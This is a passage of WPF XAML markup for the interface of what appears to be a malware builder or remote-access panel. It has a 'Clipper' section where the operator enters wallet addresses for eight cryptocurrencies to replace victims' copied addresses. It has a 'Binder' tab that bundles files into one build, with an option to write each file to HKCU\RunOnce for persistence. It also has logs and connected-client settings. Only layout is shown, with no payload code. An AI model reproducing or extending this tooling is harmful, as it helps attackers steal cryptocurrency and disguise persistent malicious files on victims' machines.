                                                <TextBlock Text="ETH" Foreground="#627EEA" FontSize="11" FontWeight="Bold" FontFamily="Consolas" VerticalAlignment="Center"/>
                                            </StackPanel>
                                            <TextBox x:Name="ClipperETH" Grid.Column="1" Style="{StaticResource STxt}" Height="30" FontSize="11" ToolTip="Ethereum / BNB (0x...)"/></Grid>
                                        <!-- LTC -->
                                        <Grid Margin="0,0,0,8"><Grid.ColumnDefinitions><ColumnDefinition Width="64"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                            <StackPanel Grid.Column="0" Orientation="Horizontal" VerticalAlignment="Center">
                                                <Image Source="/Resources/crypto/ltc.png" Width="22" Height="22" Margin="0,0,6,0" RenderOptions.BitmapScalingMode="HighQuality"/>
                                                <TextBlock Text="LTC" Foreground="#A0A0B8" FontSize="11" FontWeight="Bold" FontFamily="Consolas" VerticalAlignment="Center"/>
                                            </StackPanel>
                                            <TextBox x:Name="ClipperLTC" Grid.Column="1" Style="{StaticResource STxt}" Height="30" FontSize="11" ToolTip="Litecoin (L... / M...)"/></Grid>
                                        <!-- TRX -->
                                        <Grid Margin="0,0,0,8"><Grid.ColumnDefinitions><ColumnDefinition Width="64"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                            <StackPanel Grid.Column="0" Orientation="Horizontal" VerticalAlignment="Center">
                                                <Image Source="/Resources/crypto/trx.png" Width="22" Height="22" Margin="0,0,6,0" RenderOptions.BitmapScalingMode="HighQuality"/>
                                                <TextBlock Text="TRX" Foreground="#EF0027" FontSize="11" FontWeight="Bold" FontFamily="Consolas" VerticalAlignment="Center"/>
                                            </StackPanel>
                                            <TextBox x:Name="ClipperTRX" Grid.Column="1" Style="{StaticResource STxt}" Height="30" FontSize="11" ToolTip="TRON (T...)"/></Grid>
                                        <!-- SOL -->
                                        <Grid Margin="0,0,0,8"><Grid.ColumnDefinitions><ColumnDefinition Width="64"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                            <StackPanel Grid.Column="0" Orientation="Horizontal" VerticalAlignment="Center">
                                                <Image Source="/Resources/crypto/sol.png" Width="22" Height="22" Margin="0,0,6,0" RenderOptions.BitmapScalingMode="HighQuality"/>
                                                <TextBlock Text="SOL" Foreground="#9945FF" FontSize="11" FontWeight="Bold" FontFamily="Consolas" VerticalAlignment="Center"/>
                                            </StackPanel>
                                            <TextBox x:Name="ClipperSOL" Grid.Column="1" Style="{StaticResource STxt}" Height="30" FontSize="11" ToolTip="Solana (base58, 32-44 chars)"/></Grid>
                                        <!-- XMR -->
                                        <Grid Margin="0,0,0,8"><Grid.ColumnDefinitions><ColumnDefinition Width="64"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                            <StackPanel Grid.Column="0" Orientation="Horizontal" VerticalAlignment="Center">
                                                <Image Source="/Resources/crypto/xmr.png" Width="22" Height="22" Margin="0,0,6,0" RenderOptions.BitmapScalingMode="HighQuality"/>
                                                <TextBlock Text="XMR" Foreground="#FF6600" FontSize="11" FontWeight="Bold" FontFamily="Consolas" VerticalAlignment="Center"/>
                                            </StackPanel>
                                            <TextBox x:Name="ClipperXMR" Grid.Column="1" Style="{StaticResource STxt}" Height="30" FontSize="11" ToolTip="Monero (4...)"/></Grid>
                                        <!-- XRP -->
                                        <Grid Margin="0,0,0,8"><Grid.ColumnDefinitions><ColumnDefinition Width="64"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                            <StackPanel Grid.Column="0" Orientation="Horizontal" VerticalAlignment="Center">
                                                <Image Source="/Resources/crypto/xrp.png" Width="22" Height="22" Margin="0,0,6,0" RenderOptions.BitmapScalingMode="HighQuality"/>
                                                <TextBlock Text="XRP" Foreground="#00AAE4" FontSize="11" FontWeight="Bold" FontFamily="Consolas" VerticalAlignment="Center"/>
                                            </StackPanel>
                                            <TextBox x:Name="ClipperXRP" Grid.Column="1" Style="{StaticResource STxt}" Height="30" FontSize="11" ToolTip="Ripple (r...)"/></Grid>
                                        <!-- DASH -->
                                        <Grid Margin="0,0,0,8"><Grid.ColumnDefinitions><ColumnDefinition Width="64"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                            <StackPanel Grid.Column="0" Orientation="Horizontal" VerticalAlignment="Center">
                                                <Image Source="/Resources/crypto/dash.png" Width="22" Height="22" Margin="0,0,6,0" RenderOptions.BitmapScalingMode="HighQuality"/>
                                                <TextBlock Text="DASH" Foreground="#008CE7" FontSize="11" FontWeight="Bold" FontFamily="Consolas" VerticalAlignment="Center"/>
                                            </StackPanel>
                                            <TextBox x:Name="ClipperDASH" Grid.Column="1" Style="{StaticResource STxt}" Height="30" FontSize="11" ToolTip="Dash (X...)"/></Grid>
                                        <!-- BCH -->
                                        <Grid><Grid.ColumnDefinitions><ColumnDefinition Width="64"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                            <StackPanel Grid.Column="0" Orientation="Horizontal" VerticalAlignment="Center">
                                                <Image Source="/Resources/crypto/bch.png" Width="22" Height="22" Margin="0,0,6,0" RenderOptions.BitmapScalingMode="HighQuality"/>
                                                <TextBlock Text="BCH" Foreground="#4CC947" FontSize="11" FontWeight="Bold" FontFamily="Consolas" VerticalAlignment="Center"/>
                                            </StackPanel>
                                            <TextBox x:Name="ClipperBCH" Grid.Column="1" Style="{StaticResource STxt}" Height="30" FontSize="11" ToolTip="Bitcoin Cash"/></Grid>
                                    </StackPanel>
                                </Border>

                            </DockPanel>
                            </ScrollViewer>
                        </Grid>
                    </Border>
                </TabItem>

                <!-- ── Binder ── -->
                <TabItem>
                    <TabItem.Header>
                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                            <TextBlock Text="📎" FontSize="12" Margin="0,0,5,0" VerticalAlignment="Center"/>
                            <TextBlock Text="Binder"/>
                        </StackPanel>
                    </TabItem.Header>
                    <DockPanel Margin="8">
                        <!-- Toolbar -->
                        <Border DockPanel.Dock="Top" Background="#0A0B14" CornerRadius="6" Padding="8,5" Margin="0,0,0,6">
                            <WrapPanel>
                                <Button x:Name="BtnBinderAdd"    Content="＋ Add"    Style="{StaticResource SBtn}" Margin="0,0,4,0" Height="26" Padding="10,0" Click="BtnBinderAdd_Click"/>
                                <Button x:Name="BtnBinderRemove" Content="✕ Remove" Style="{StaticResource SBtn}" Margin="0,0,4,0" Height="26" Padding="10,0" Click="BtnBinderRemove_Click"/>
                                <Button x:Name="BtnBinderUp"     Content="▲" ToolTip="Move up"   Style="{StaticResource SBtn}" Margin="0,0,4,0" Height="26" Width="30" FontSize="10" Click="BtnBinderUp_Click"/>
                                <Button x:Name="BtnBinderDown"   Content="▼" ToolTip="Move down" Style="{StaticResource SBtn}" Margin="0,0,0,0" Height="26" Width="30" FontSize="10" Click="BtnBinderDown_Click"/>
                            </WrapPanel>
                        </Border>
                        <!-- Bottom controls -->
                        <Border DockPanel.Dock="Bottom" Background="#0A0B14" CornerRadius="6" Padding="10,8" Margin="0,6,0,0">
                            <StackPanel>
                                <StackPanel Orientation="Horizontal" Margin="0,0,0,6">
                                    <TextBlock Text="Icon :" Foreground="#505870" Width="52" VerticalAlignment="Center" FontSize="11"/>
                                    <Border Width="22" Height="22" Margin="0,0,6,0" VerticalAlignment="Center" Background="#0C0D18" CornerRadius="3">
                                        <Image x:Name="BinderIconPreview" Width="16" Height="16" RenderOptions.BitmapScalingMode="HighQuality"/>
                                    </Border>
                                    <Button Content="📁 Select" Style="{StaticResource SBtn}" Height="24" Padding="8,0" Margin="0,0,4,0" Click="BtnBinderSelectIcon_Click" FontSize="11"/>
                                    <Button Content="✕"         Style="{StaticResource SBtn}" Height="24" Width="24"   Padding="0"    Click="BtnBinderClearIcon_Click"  FontSize="11"/>
                                </StackPanel>
                                <StackPanel Orientation="Horizontal">
                                    <Button x:Name="BtnBinderBuild" Content="⚙ Build" Style="{StaticResource SGreenBtn}" Height="30" Width="110" Click="BtnBinderBuild_Click"/>
                                    <TextBlock x:Name="TxtBinderStatus" Text="Ready" Foreground="#505870" FontFamily="Consolas" FontSize="11" VerticalAlignment="Center" Margin="10,0,0,0"/>
                                </StackPanel>
                            </StackPanel>
                        </Border>
                        <!-- File list -->
                        <DataGrid x:Name="BinderGrid" AutoGenerateColumns="False" IsReadOnly="False"
                                  Background="#0C0D18" Foreground="#CDD0E8" BorderThickness="0"
                                  RowBackground="Transparent" AlternatingRowBackground="#05101428"
                                  GridLinesVisibility="Horizontal" HorizontalGridLinesBrush="#0C0E1A"
                                  HeadersVisibility="Column" FontFamily="Segoe UI" FontSize="12"
                                  SelectionMode="Single" CanUserAddRows="False" CanUserDeleteRows="False"
                                  CanUserResizeColumns="False"
                                  VirtualizingStackPanel.IsVirtualizing="True"
                                  ColumnHeaderStyle="{StaticResource SColHeader}">
                            <DataGrid.RowStyle>
                                <Style TargetType="DataGridRow">
                                    <Setter Property="Background" Value="Transparent"/>
                                    <Setter Property="Foreground" Value="#CDD0E8"/>
                                    <Setter Property="BorderThickness" Value="0"/>
                                    <Style.Triggers>
                                        <Trigger Property="IsMouseOver" Value="True"><Setter Property="Background" Value="#0F1525"/></Trigger>
                                        <Trigger Property="IsSelected"  Value="True"><Setter Property="Background" Value="#152040"/><Setter Property="Foreground" Value="#FFFFFF"/></Trigger>
                                    </Style.Triggers>
                                </Style>
                            </DataGrid.RowStyle>
                            <DataGrid.Columns>
                                <DataGridTemplateColumn Width="44" CanUserSort="False">
                                    <DataGridTemplateColumn.CellStyle>
                                        <Style TargetType="DataGridCell" BasedOn="{StaticResource {x:Type DataGridCell}}">
                                            <Setter Property="Padding" Value="0"/>
                                        </Style>
                                    </DataGridTemplateColumn.CellStyle>
                                    <DataGridTemplateColumn.CellTemplate>
                                        <DataTemplate>
                                            <Image Source="{Binding Icon}" Width="18" Height="18"
                                                   Stretch="Uniform"
                                                   RenderOptions.BitmapScalingMode="HighQuality"
                                                   HorizontalAlignment="Center" VerticalAlignment="Center"/>
                                        </DataTemplate>
                                    </DataGridTemplateColumn.CellTemplate>
                                </DataGridTemplateColumn>
                                <DataGridTextColumn Header="FILE"    Binding="{Binding FileName}"    Width="*"   IsReadOnly="True"/>
                                <DataGridTextColumn Header="SIZE"    Binding="{Binding SizeDisplay}" Width="80"  IsReadOnly="True" FontFamily="Consolas" FontSize="11"/>
                                <DataGridTemplateColumn Header="RUN ONCE" Width="85" CanUserSort="False">
                                    <DataGridTemplateColumn.CellTemplate>
                                        <DataTemplate>
                                            <CheckBox IsChecked="{Binding RunOnce, Mode=TwoWay, UpdateSourceTrigger=PropertyChanged}"
                                                      HorizontalAlignment="Center" VerticalAlignment="Center"
                                                      ToolTip="Write this file's path to HKCU\RunOnce on execution"/>
                                        </DataTemplate>
                                    </DataGridTemplateColumn.CellTemplate>
                                </DataGridTemplateColumn>
                            </DataGrid.Columns>
                            <DataGrid.ContextMenu>
                                <ContextMenu>
                                    <MenuItem Header="Remove Entry" Click="BtnBinderRemove_Click">
                                        <MenuItem.Icon><TextBlock Text="&#x1F5D1;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon>
                                    </MenuItem>
                                    <MenuItem Header="Clear All" Click="BtnBinderClearAll_Click">
                                        <MenuItem.Icon><TextBlock Text="&#x1F5D1;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon>
                                    </MenuItem>
                                    <Separator />
                                    <MenuItem Header="Move Up" Click="BtnBinderUp_Click">
                                        <MenuItem.Icon><TextBlock Text="&#x25B2;" FontSize="10" Foreground="#89b4fa"/></MenuItem.Icon>
                                    </MenuItem>
                                    <MenuItem Header="Move Down" Click="BtnBinderDown_Click">
                                        <MenuItem.Icon><TextBlock Text="&#x25BC;" FontSize="10" Foreground="#89b4fa"/></MenuItem.Icon>
                                    </MenuItem>
                                </ContextMenu>
                            </DataGrid.ContextMenu>
                        </DataGrid>
                    </DockPanel>
                </TabItem>

                <!-- ── Logs ── -->
                <TabItem x:Name="LogsTabItem">
                    <TabItem.Header>
                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                            <TextBlock Text="≋" Foreground="#606880" FontSize="13" Margin="0,0,5,0" VerticalAlignment="Center"/>
                            <TextBlock Text="Logs"/>
                        </StackPanel>
                    </TabItem.Header>
                    <Border Margin="8" Padding="4" CornerRadius="8"
                            Background="#FF000000" BorderThickness="1">
                        <Border.BorderBrush>
                            <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                                <GradientStop Color="#283040FF" Offset="0"/>
                                <GradientStop Color="#121E2038" Offset="1"/>
                            </LinearGradientBrush>
                        </Border.BorderBrush>
                        <DockPanel>
                            <Grid DockPanel.Dock="Top" Margin="6,4,6,8">
                                <TextBlock Text="SYSTEM EVENT LOGS" Foreground="#606880" FontSize="11" FontWeight="Bold" FontFamily="Segoe UI" VerticalAlignment="Center" Margin="4,0,0,0"/>
                                <StackPanel Orientation="Horizontal" HorizontalAlignment="Right" VerticalAlignment="Center">
                                    <Button Content="CLEAR" Height="22" Padding="10,0" Style="{StaticResource SBtn}" FontSize="10" FontWeight="SemiBold" Click="ClearLogs_Click"/>
                                </StackPanel>
                            </Grid>
                            
                            <!-- RichTextBox: supports coloured runs AND text selection/copy -->
                            <RichTextBox x:Name="TxtLogs"
                                         Background="Transparent" BorderThickness="0"
                                         FontFamily="Consolas" FontSize="11"
                                         IsReadOnly="True" IsDocumentEnabled="True"
                                         VerticalScrollBarVisibility="Auto"
                                         HorizontalScrollBarVisibility="Disabled"
                                         ScrollViewer.ScrollChanged="TxtLogs_ScrollChanged"
                                         Padding="8,6"
                                         SelectionBrush="#404878" CaretBrush="Transparent">
                                <RichTextBox.Resources>
                                    <!-- Remove the default 4px paragraph spacing -->
                                    <Style TargetType="Paragraph">
                                        <Setter Property="Margin" Value="0"/>
                                        <Setter Property="LineHeight" Value="16"/>
                                    </Style>
                                </RichTextBox.Resources>
                            </RichTextBox>
                        </DockPanel>
                    </Border>
                </TabItem>

                <!-- ── Settings ── -->
                <TabItem>
                    <TabItem.Header>
                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                            <TextBlock Text="⚙" Foreground="#606880" FontSize="11" Margin="0,0,5,0" VerticalAlignment="Center"/>
                            <TextBlock Text="Settings"/>
                        </StackPanel>
                    </TabItem.Header>
                    <Border Margin="8" CornerRadius="8"
                            Background="#D0111222" BorderThickness="1">
                        <Border.BorderBrush>
                            <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                                <GradientStop Color="#283040FF" Offset="0"/>
                                <GradientStop Color="#121E2038" Offset="1"/>
                            </LinearGradientBrush>
                        </Border.BorderBrush>
                        <ScrollViewer VerticalScrollBarVisibility="Auto"
                                      HorizontalScrollBarVisibility="Disabled">
                            <Grid Margin="24" MaxWidth="1050" HorizontalAlignment="Center">
                                <Grid.ColumnDefinitions>
                                    <ColumnDefinition Width="*" MinWidth="340"/>
                                    <ColumnDefinition Width="40"/>
                                    <ColumnDefinition Width="*" MinWidth="440"/>
                                </Grid.ColumnDefinitions>

                                <!-- Left Column: Settings -->
                                <StackPanel Grid.Column="0">
                                    <TextBlock Text="SERVER LIMITS" Style="{StaticResource SLabel}" />
                                    <TextBlock Text="MAX CONNECTED CLIENTS" Style="{StaticResource SFieldLabel}" />
                                    <StackPanel Orientation="Horizontal" Margin="0,0,0,6">
